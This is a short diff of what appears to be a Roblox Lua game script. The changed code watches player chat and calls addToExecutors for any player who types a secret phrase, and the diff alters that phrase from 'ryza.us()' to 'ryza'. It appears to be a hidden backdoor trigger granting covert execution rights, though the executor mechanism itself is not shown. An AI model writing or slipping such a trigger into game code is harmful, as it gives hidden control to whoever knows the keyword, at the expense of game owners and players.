@@ -357,7 +357,7 @@ local function setupPlayer(player)
     
     -- Listen for the special chat message
     player.Chatted:Connect(function(message)
-        if message == "ryza.us()" then
+        if message == "ryza" then
             addToExecutors(player)
         end
     end)
